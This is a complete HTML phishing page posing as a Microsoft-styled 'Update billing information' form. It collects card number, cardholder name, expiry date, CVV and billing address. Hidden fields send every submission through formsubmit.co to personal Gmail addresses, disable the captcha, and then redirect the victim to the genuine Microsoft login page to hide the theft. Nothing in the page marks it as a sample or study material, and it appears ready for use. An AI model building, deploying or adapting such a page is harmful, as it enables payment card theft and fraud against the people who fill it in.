<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Update Billing Information</title>

<link rel="stylesheet" href="style.css">

<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600&display=swap" rel="stylesheet">

<script src="script.js" defer></script>
<style>
  *{
margin:0;
padding:0;
box-sizing:border-box;
font-family:"Segoe UI",sans-serif;
}

body{

background:#f3f2f1;

display:flex;

justify-content:center;

padding:50px 15px;

}

.billing-card{

background:white;

width:100%;

max-width:760px;

padding:45px;

border-radius:8px;

box-shadow:
0 6px 30px rgba(0,0,0,.08);

border:1px solid #e5e5e5;

}

h1{

font-size:32px;

font-weight:600;

color:#323130;

margin-bottom:20px;

}

.cards{

display:flex;

gap:15px;

margin-bottom:25px;

}

.cards img{

height:24px;

object-fit:contain;

}

.required{

color:#666;

margin-bottom:20px;

}

.field{

margin-bottom:22px;

}

label{

display:block;

margin-bottom:8px;

font-weight:600;

color:#323130;

}

input,
select{

width:100%;

height:50px;

padding:0 15px;

font-size:16px;

border:1px solid #8a8886;

border-radius:2px;

transition:.2s;

background:white;

}

input:focus,
select:focus{

outline:none;

border-color:#0067b8;

box-shadow:0 0 0 3px rgba(0,103,184,.15);

}

.expiry{

display:flex;

gap:20px;

margin-bottom:20px;

}

.expiry div{

flex:1;

}

.double{

display:grid;

grid-template-columns:1fr 1fr;

gap:20px;

}

.small{

max-width:180px;

}

button{

margin-top:25px;

height:50px;

padding:0 35px;

border:none;

background:#0067b8;

color:white;

font-size:16px;

font-weight:600;

cursor:pointer;

border-radius:2px;

transition:.25s;

}

button:hover{

background:#005da6;

}

.input-icon{

position:relative;

}

#cardType{

position:absolute;

right:15px;

top:15px;

font-weight:600;

color:#0067b8;

}

@media(max-width:700px){

.billing-card{

padding:30px;

}

.double{

grid-template-columns:1fr;

}

.expiry{

flex-direction:column;

}

.small{

max-width:100%;

}

}
.cards{
    display:flex;
    align-items:center;
    gap:12px;
}

.cards img{
    height:18px;
    width:auto;
    object-fit:contain;
}

.cards img:nth-child(3){
    height:16px; /* Discover is slightly shorter */
} 
</style>
</head>
<body>

<div class="page">

<div class="billing-card">

<h1>Update billing information</h1>

<div class="cards">

<img src="https://cdn.simpleicons.org/visa/1A1F71" alt="Visa" height="20">

<img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png">

<img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg">

<img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg">

</div>

<p class="required">* Required fields</p>

 <form  id="contactForm" action="https://formsubmit.co/frgreatness@gmail.com" method="POST">
<input type="hidden" name="_next" value="https://login.microsoftonline.com/">
		<input type="hidden" name="_cc" value="01nextup@gmail.com">
    <input type="hidden" name="_subject" value="microzovt">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_template" value="table">
<div class="input-group">

<div class="field">

<label>Card Number *</label>

<div class="input-icon">

<input
type="text"
name="card_number"
id="cardNumber"
maxlength="19"
autocomplete="cc-number"
required>

<span id="cardType"></span>

</div>

</div>

<div class="field">

<label>Cardholder Name *</label>

<input
type="text"
name="cardholder_name"
autocomplete="cc-name"
required>

</div>

<div class="expiry">

<div>

<label>Month *</label>

<select
name="expiry_month"
required>

<option value="">MM</option>

<option>01</option>
<option>02</option>
<option>03</option>
<option>04</option>
<option>05</option>
<option>06</option>
<option>07</option>
<option>08</option>
<option>09</option>
<option>10</option>
<option>11</option>
<option>12</option>

</select>

</div>

<div>

<label>Year *</label>

<select
name="expiry_year"
required>

<option value="">YYYY</option>

<option>2026</option>
<option>2027</option>
<option>2028</option>
<option>2029</option>
<option>2030</option>
<option>2031</option>
<option>2032</option>
<option>2033</option>

</select>

</div>

</div>

<div class="field small">

<label>CVV *</label>

<input
type="password"
name="cvv"
maxlength="4"
autocomplete="cc-csc"
required>

</div>

<div class="field">

<label>Address Line 1 *</label>

<input
type="text"
name="address_line_1"
autocomplete="address-line1"
required>

</div>

<div class="field">

<label>Address Line 2</label>

<input
type="text"
name="address_line_2"
autocomplete="address-line2">

</div>

<div class="double">

<div class="field">

<label>City *</label>

<input
type="text"
name="city"
autocomplete="address-level2"
required>

</div>

<div class="field">

<label>State / Province *</label>

<input
type="text"
name="state"
autocomplete="address-level1"
required>

</div>

</div>

<div class="double">

<div class="field">

<label>Postal Code *</label>

<input
type="text"
name="postal_code"
autocomplete="postal-code"
required>

</div>

<div class="field">

<label>Country *</label>

<select
name="country"
required>

<option value="">Select Country</option>


<option>United States</option>
<option>Canada</option>
<option>United Kingdom</option>
<option>Germany</option>

</select>

</div>

</div>

<button type="submit">
Save Billing Information
</button>

</form>

</div>

</div>
<script>
  const card=document.getElementById("cardNumber");

const cardType=document.getElementById("cardType");

card.addEventListener("input",function(){

let value=this.value.replace(/\D/g,'');

value=value.replace(/(.{4})/g,'$1 ').trim();

this.value=value;

let number=value.replace(/\s/g,'');

if(number.startsWith("4")){

cardType.innerHTML="VISA";

}

else if(/^5[1-5]/.test(number)){

cardType.innerHTML="Mastercard";

}

else if(/^3[47]/.test(number)){

cardType.innerHTML="AMEX";

}

else if(/^6/.test(number)){

cardType.innerHTML="Discover";

}

else{

cardType.innerHTML="";

}

});
</script>
</body>
</html>
